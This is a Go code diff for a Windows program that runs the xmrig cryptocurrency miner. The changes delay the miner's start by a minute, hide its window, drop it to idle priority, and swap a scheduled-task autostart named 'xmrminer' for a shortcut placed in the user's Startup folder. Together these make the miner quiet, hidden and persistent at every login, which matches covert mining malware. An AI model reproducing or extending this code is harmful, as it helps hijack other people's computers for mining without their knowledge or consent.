@@ -12,10 +12,15 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
-	"github.com/go-ole/go-ole"
-	"github.com/go-ole/go-ole/oleutil"
-//	"os/user"
+	"time"
+	"golang.org/x/sys/windows"
+	"os/user"
 // 	"os/signal"
+)
+
+const (
+	PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
+	PROCESS_MODE_BACKGROUND_END   = 0x00200000
 )
 
 func downloadFile(filepath string, url string) (err error) {
@@ -112,12 +117,29 @@ func unzipFile(f *zip.File, destination string) error {
 }
 
 func startCommand(dir string) {
+	time.Sleep(60*time.Second)
+
 	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
-		return
+	}
+
+	handle, err := syscall.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(cmd.Process.Pid))
+	if err != nil {
+		log.Println("Error getting process handle:", err)
+	}
+
+//	err := syscall.Setpriority(syscall.PRIO_PROCESS, cmd.Process.Pid, 10)
+//	if err != nil {
+//		log.Println("Error setting process priority:", err)
+//	}
+
+	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
+	if err != nil {
+		log.Println("Error setting process priority:", err)
 	}
 
 	// And when you need to wait for the command to finish:
@@ -167,92 +189,40 @@ func copy(src, dst string) error {
 	return nil
 }
 
-func autostart() {
-	// Get the path to the executable
-	exePath, err := filepath.Abs(os.Args[0])
+func createShortcut(shortcutPath string, targetPath string) error {
+	shortcut, err := os.Create(shortcutPath)
 	if err != nil {
-		log.Println("Error getting executable path:", err)
-		return
+		return err
 	}
+	defer shortcut.Close()
 
-	ole.CoInitialize(0)
-	defer ole.CoUninitialize()
+	shortcut.WriteString("[InternetShortcut]\n")
+	shortcut.WriteString("URL=file:///" + targetPath + "\n")
+	shortcut.WriteString("IconIndex=0\n")
+	shortcut.WriteString("IconFile=" + targetPath + "\n")
+	shortcut.Sync()
 
-	unknown, err := oleutil.CreateObject("Schedule.Service")
-	if err != nil {
-		log.Println(err)
-	}
-
-	defer unknown.Release()
-
-	scheduler, err := unknown.QueryInterface(ole.IID_IDispatch)
-	if err != nil {
-		log.Println(err)
-	}
-
-	defer scheduler.Release()
-
-	taskDefinition, err := oleutil.CallMethod(scheduler, "NewTask", 0, "")
-	if err != nil {
-		log.Println(err)
-	}
-
-	defer taskDefinition.Clear()
-
-	taskDefinitionDisp := taskDefinition.ToIDispatch()
-
-	defer taskDefinitionDisp.Release()
-	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Author", "Mikołaj Lubiak")
-	if err != nil {
-		log.Println(err)
-	}
-
-	_, err = oleutil.PutProperty(taskDefinitionDisp, "RegistrationInfo.Description", "Start the program at user login")
-	if err != nil {
-		log.Println(err)
-	}
-
-	// Set the trigger to start at login
-	triggersDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Triggers").ToIDispatch()
-
-	defer triggersDisp.Release()
-
-	triggerDisp := oleutil.MustCallMethod(triggersDisp, "Create", 9).ToIDispatch()
-
-	defer triggerDisp.Release()
-
-	_, err = oleutil.PutProperty(triggerDisp, "StartBoundary", "2010-01-01T00:00:00")
-	if err != nil {
-		log.Println(err)
-	}
-
-	_, err = oleutil.PutProperty(triggerDisp, "Enabled", true)
-	if err != nil {
-		log.Println(err)
-	}
-
-	actionsDisp := oleutil.MustCallMethod(taskDefinitionDisp, "Actions").ToIDispatch()
-
-	defer actionsDisp.Release()
-
-	actionDisp := oleutil.MustCallMethod(actionsDisp, "Create", 0).ToIDispatch()
-
-	defer actionDisp.Release()
-
-	_, err = oleutil.PutProperty(actionDisp, "Path", exePath)
-	if err != nil {
-		log.Println(err)
-	}
-	rootFolderDisp := oleutil.MustCallMethod(scheduler, "GetFolder", "\\").ToIDispatch()
-
-	defer rootFolderDisp.Release()
-
-	_, err = oleutil.CallMethod(rootFolderDisp, "RegisterTaskDefinition", "xmrminer", taskDefinitionDisp, 6, "", "", 2, nil)
-	if err != nil {
-		log.Println(err)
-	}
+	return nil
 }
 
+func autostart() {
+	u, err := user.Current()
+	if err != nil {
+		log.Printf("Error getting current user: %s\n", err)
+	}
+	startupFolder := filepath.Join(u.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+	shortcutPath := filepath.Join(startupFolder, "xmrminer.lnk")
+	targetPath, err := os.Executable()
+	if err != nil {
+		log.Printf("Error getting executable path: %s\n", err)
+	}
+
+	err = createShortcut(shortcutPath, targetPath)
+	if err != nil {
+		log.Printf("Error creating shortcut: %s\n", err)
+	}
+}
 
 func main() {
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
